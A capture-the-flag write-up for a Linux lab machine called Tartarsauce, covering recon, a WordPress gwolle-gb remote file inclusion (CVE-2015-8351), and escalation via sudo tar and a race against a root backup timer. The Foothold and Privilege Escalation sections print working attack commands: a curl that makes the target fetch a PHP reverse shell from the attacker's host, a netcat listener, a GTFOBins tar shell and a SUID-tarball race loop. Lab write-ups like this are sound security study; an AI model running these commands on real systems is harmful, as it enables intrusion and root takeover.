# Tartarsauce — Medium — Linux

**Date:** 17 - August - 2026

---
## Tags

`#linux` `#web` `#wordpress` `#rfi` `#gwolle-gb` `#cve-2015-8351` `#sudo` `#gtfobins` `#tar` `#systemd-timer` `#race-condition` `#privesc`

---

## What I Know

| Item       | Detail                                                                                    |
| ---------- | ----------------------------------------------------------------------------------------- |
| Target     | 10.129.1.185 (host: tartarsauce.htb)                                                       |
| OS         | Ubuntu Linux                                                                               |
| Open ports | 80                                                                                         |
| Services   | Apache httpd 2.4.18 (WordPress at /webservices/wp/)                                        |
| Foothold   | gwolle-gb ≤1.5.3 RFI (CVE-2015-8351) via `abspath` → shell as `www-data`                   |
| User       | `www-data` → `onuma` via `sudo -u onuma tar` (GTFOBins) → user.txt                         |
| Privesc    | `backuperer` systemd timer: race the 30s sleep to unpack a root-owned SUID shell → root    |
| Flags      | user.txt as onuma; root.txt as root                                                        |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.1.185
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 22:13 +0100
Nmap scan report for tartarsauce.htb (10.129.1.185)
Host is up (0.036s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
```

<img width="861" height="299" alt="image" src="https://github.com/user-attachments/assets/8a6ccff0-6a81-4d88-804c-1947baabd02e" />

```
nmap -sC -sV -p80 10.129.1.185
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 22:14 +0100
Nmap scan report for tartarsauce.htb (10.129.1.185)
Host is up (0.017s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/

Nmap done: 1 IP address (1 host up) scanned in 68.35 seconds
```
<img width="1197" height="405" alt="image" src="https://github.com/user-attachments/assets/a9f140fb-8f89-4b1d-bc71-76a8edde2227" />

**What each port tells me:**
- **Port 80 (HTTP)** — The only open port; Apache serving a web application, so this is my sole entry point. The robots.txt already leaks five interesting paths to enumerate.

---
## Enumeration Log

```
OBSERVATION:
- The landing page is generic with little information
- nmap surfaced robots.txt with 5 disallowed entries
- Of those, only /webservices/monstra-3.0.4/ returns a working app, everything else leads to 404
- Most page links in webservices/monstra-3.0.4/ lead to a 404; a "logged in" link leads to a login page. Default
creds admin:admin worked and logged me into Monstra
WHAT IT TELLS ME:
- Research Monstra 3.0.4 for RCE
- There are likely more hidden directories
WHAT I AM GOING TO TRY:
- Check Monstra 3.0.4 for exploitable RCE
- Dir-fuzz for more paths
WHY:
- Monstra is the only working app so far, so an RCE there would be a foothold; fuzzing may
  reveal other apps
RESULT:
- searchsploit shows Monstra 3.0.4 has an authenticated RCE, but the exploit doesn't pan out
  here it points me to a URL that just 404s (this box is known for planted rabbit holes)
- Meanwhile my background dir-fuzz found /webservices/wp/, a WordPress site
WHAT NEXT:
- Park Monstra (rabbit hole) and enumerate the WordPress install
```

<img width="1769" height="919" alt="image" src="https://github.com/user-attachments/assets/0a79124d-058b-4a50-b081-5f3aed2c75c1" />

<img width="721" height="245" alt="image" src="https://github.com/user-attachments/assets/c9fa8a3b-6083-4926-9c63-3d5006a7b694" />

<img width="2018" height="889" alt="image" src="https://github.com/user-attachments/assets/15a3e7f5-54ef-4214-8352-00c11cea2cb1" />

<img width="1960" height="732" alt="image" src="https://github.com/user-attachments/assets/78d8eacc-42a4-4eff-aab8-5e596d741983" />

<img width="2080" height="545" alt="image" src="https://github.com/user-attachments/assets/f7a483f9-07f7-4701-9114-fdb4816f5266" />

<img width="2450" height="447" alt="image" src="https://github.com/user-attachments/assets/53fcdea1-774c-49cc-8567-e35b5dd73b08" />

<img width="2281" height="969" alt="image" src="https://github.com/user-attachments/assets/4fc4c5ba-9f5b-4343-9b38-110462b9c3b4" />

<img width="2546" height="695" alt="image" src="https://github.com/user-attachments/assets/f3073122-e5a0-4b6d-8d9b-8d636e474019" />

```
OBSERVATION:
- wpscan (with --plugins-detection aggressive; a normal scan missed the plugins that dir-fuzz
  had shown) enumerated the WP version, XML-RPC enabled, and plugins: akismet,
  brute-force-login-protection, gwolle-gb
WHAT IT TELLS ME:
- Research each version/plugin for a known vulnerability
WHAT I AM GOING TO TRY:
- Look up the WP version and plugins for exploitable issues
WHY:
- Logical next step after wpscan; a vulnerable plugin is the likely foothold
RESULT:
- WP core, akismet and brute-force-login-protection: no usable RCE
- gwolle-gb: CVE-2015-8351, Remote File Inclusion in versions <= 1.5.3 (the abspath
  parameter is passed unsanitized into PHP require(), so it will fetch and execute a remote
  wp-load.php). wpscan reported version 2.3.10, BUT reading the plugin's readme shows the
  version string was deliberately falsified, the actual code is the vulnerable 1.5.3-era
- Exploited the gwolle-gb RFI by hosting a malicious wp-load.php (php reverse shell) on my
  attack machine  and requesting it via abspath → shell as www-data
- sudo -l as www-data shows: may run /bin/tar as user onuma WITHOUT a password
- GTFOBins: tar's --checkpoint-action=exec runs an arbitrary command, so I used it to spawn a
  shell as onuma → read user.txt
WHAT NEXT:
- Enumerate as onuma for a path to root
```
<img width="1317" height="1085" alt="Pasted image 20260818231447" src="https://github.com/user-attachments/assets/1b5d46c9-d4a1-42eb-82ce-df62e5c2ecaf" />

<img width="1426" height="1084" alt="Pasted image 20260818231501" src="https://github.com/user-attachments/assets/b467fb24-a2c5-4187-9685-ed3b9325df72" />

<img width="2625" height="1110" alt="Pasted image 20260818232029" src="https://github.com/user-attachments/assets/45b38018-832f-4063-bdcf-df05c990d3b8" />

<img width="612" height="346" alt="Pasted image 20260818231626" src="https://github.com/user-attachments/assets/d750498d-017c-4d2f-a69f-6854e1172791" />

<img width="1075" height="331" alt="Pasted image 20260818231943" src="https://github.com/user-attachments/assets/07dc59ed-21a9-4d80-8fac-c1c1489feb81" />

<img width="1313" height="623" alt="Pasted image 20260818232352" src="https://github.com/user-attachments/assets/c64dd86b-c74d-4980-af6a-cdc066290606" />

<img width="2722" height="1133" alt="Pasted image 20260818232412" src="https://github.com/user-attachments/assets/d8e05fa1-5d93-4695-987c-3a286ffc4049" />

<img width="1261" height="233" alt="Pasted image 20260818232519" src="https://github.com/user-attachments/assets/908a6ad6-c727-4600-8db7-2c448a771587" />

```
OBSERVATION:
- linpeas as onuma flags an unusual systemd timer (timers run like cron, typically as root).
  If I can influence what it runs, I execute as root
- The unit is backuperer: /usr/sbin/backuperer runs every 5 minutes. Reading the script:
  1. sets some path variables
  2. does housekeeping (writes testmsg, cleanup)
  3. tars $basedir (/var/www/html) into $tmpfile ($tmpdir/.sha1hash, i.e. /var/tmp/.<sha1>)
  4. sleeps 30 seconds
  5. creates $check (/var/tmp/check) and extracts the tarball into it AS ROOT
  6. integrity-checks $check/$basedir against $basedir; if equal, moves it to the backup dir
     (onuma-www-dev.bak) and cleans up; if different, it writes an error and LEAVES the
     extracted files in $check 
WHAT IT TELLS ME:
- The 30-second sleep between "create the tarball" and "extract it as root" is a race window.
  If I swap the tarball during the sleep for one I built, root will extract MY archive and
  because extraction preserves ownership and permission bits, a root-owned SUID shell inside
  it lands on disk as a root SUID binary
  ** Intended flow:
   - runs every 5 min; tars /var/www/html to /var/tmp/.<sha1>; sleeps 30s; makes check/;
     extracts as root; integrity check passes (same content) → archived, cleaned up
  ** Manipulated flow:
   - on my box build a tar containing a setuid-root /bin/bash-spawning binary (create it as
     root, set the SUID bit, use mkdir -p to preserve perms), copy it to the target
   - wait for backuperer to create /var/tmp/.<sha1>, then during the 30s sleep overwrite that
     file with my malicious tar
   - root creates check/ and extracts MY archive there; integrity check FAILS (my content !=
     /var/www/html), so the extracted files are left in place including my root-owned SUID
     shell
WHAT I AM GOING TO TRY:
- Build the SUID payload+tar as root on my box, transfer it, race the 30s window by copying
  it over /var/tmp/.<sha1>, then run the dropped SUID shell
WHY:
- Subverting the extract-as-root step (see above) drops a root SUID shell I can execute
RESULT:
- Won the race; executed the root-owned SUID shell and read root.txt
```

<img width="1971" height="357" alt="image" src="https://github.com/user-attachments/assets/2ce7b98c-a555-44b6-93cf-06344b2fe397" />

<img width="838" height="203" alt="Pasted image 20260818233211" src="https://github.com/user-attachments/assets/0c2164ef-853f-4bb8-acac-1bcefe2b8a20" />

<img width="791" height="331" alt="Pasted image 20260818233514" src="https://github.com/user-attachments/assets/70f34cda-945f-4bb6-a403-a38852392e9b" />

<img width="904" height="196" alt="Pasted image 20260818233352" src="https://github.com/user-attachments/assets/7e44a465-92eb-4a07-b2cc-762e1b70e497" />

<img width="1420" height="1174" alt="Pasted image 20260818233330" src="https://github.com/user-attachments/assets/a35ddb3a-a7ea-4031-8817-f466304a81ca" />

<img width="1105" height="807" alt="image" src="https://github.com/user-attachments/assets/a8073d2f-c0c5-4188-8f05-b9dc31ef5a6c" />

<img width="1140" height="885" alt="image" src="https://github.com/user-attachments/assets/ac14a890-567d-4f66-be33-c61b57743325" />

<img width="1718" height="705" alt="image" src="https://github.com/user-attachments/assets/2c779917-8e64-4c60-a512-a682ef880137" />

<img width="1086" height="984" alt="image" src="https://github.com/user-attachments/assets/1688d46b-c84f-4518-8624-5299e454f6ff" />

---

## Foothold

**How I got in:** robots.txt and dir-fuzzing exposed several web apps; Monstra 3.0.4 was a rabbit hole (its RCE exploit dead-ends here), but a background fuzz found a WordPress install at `/webservices/wp/`. `wpscan --plugins-detection aggressive` found the **gwolle-gb** plugin, vulnerable to **Remote File Inclusion (CVE-2015-8351)**, its `abspath` parameter is passed unsanitized into PHP `require()`, so it will fetch and execute a remote `wp-load.php`. The plugin's version string was deliberately falsified (reported 2.3.10 but really the vulnerable ≤1.5.3 code). I hosted a malicious `wp-load.php` and triggered it to get a shell as **www-data**.

**Command / exploit used:**

```
wpscan --url http://tartarsauce.htb/webservices/wp/ --plugins-detection aggressive -e ap

# host a php reverse shell named wp-load.php on my box, then trigger the RFI:
curl "http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://<LHOST>/"
nc -lnvp <LPORT>        # → shell as www-data
```

**Why it worked:** gwolle-gb's `ajaxresponse.php` used the attacker-controlled `abspath` value directly in a PHP `require()` call, so pointing it at `http://<LHOST>/` made the server fetch and execute `wp-load.php` from my machine, a textbook Remote File Inclusion turning into RCE. The falsified version string was a deliberate troll to make the plugin look patched to scanners while the vulnerable code remained.

---

## Privilege Escalation

**Path taken (www-data → onuma → root):**

*Stage 1 (user.txt):* `sudo -l` showed www-data may run `/bin/tar` as **onuma** without a password. Using GTFOBins' tar technique  `--checkpoint=1 --checkpoint-action=exec=/bin/bash`, I spawned a shell as **onuma** and read **user.txt**.

*Stage 2 (root.txt):* As onuma, linpeas flagged the **`backuperer`** systemd timer (runs `/usr/sbin/backuperer` every 5 minutes as root). The script tars `/var/www/html` to `/var/tmp/.<sha1>`, **sleeps 30 seconds**, then extracts that tarball into `/var/tmp/check` **as root** before an integrity check. I raced that 30-second window: I built a tar on my box containing a **root-owned SUID `/bin/bash` shell** (created as root, SUID bit set, `tar -p` to preserve perms), and during the sleep I overwrote `/var/tmp/.<sha1>` with it. Root then extracted my archive with permissions intact, the integrity check failed (so the files were left in place), and I executed the dropped root SUID shell to get **root.txt**.

**Command / exploit used:**

```
# stage 1: sudo tar → onuma (GTFOBins)
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# → shell as onuma → user.txt

# stage 2: build the SUID payload as root on the attack box
# setuid.c: setuid(0); execl("/bin/bash","bash",NULL);
gcc -o shell setuid.c && chmod +s shell        # root-owned SUID
mkdir -p var/www/html && cp shell var/www/html/
tar -zcvf exploit.tar var                       # -p/perms preserved

# on target, during the 30s sleep, overwrite the timer's tarball
while :; do cp exploit.tar /var/tmp/.*; done    # win the race
# then run the dropped SUID shell in /var/tmp/check/var/www/html
/var/tmp/check/var/www/html/shell -p            # → root → root.txt
```

**Why it worked:** Two separate tar misconfigurations. First, `sudo tar` without a password lets tar's `--checkpoint-action=exec` run any command as the target user (onuma), tar was never meant to be a shell, but that flag makes it one. Second, the backuperer script extracts an **attacker-influenceable archive as root** and does nothing to strip ownership or SUID bits from the extracted files; because the extract happens *before* the integrity check and failed checks leave the files on disk, a tarball containing a root-owned SUID binary lands as a working root SUID shell. The 30-second sleep is the exploitable race window.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Exploited a Remote File Inclusion in the WordPress gwolle-gb plugin (CVE-2015-8351) via the `abspath` parameter to execute a remote PHP shell as www-data.
2. **Privesc technique in one sentence:** Used `sudo -u onuma tar` (GTFOBins `--checkpoint-action`) to reach onuma/user.txt, then won the backuperer timer's 30-second race to have root extract a tarball containing a root-owned SUID shell.
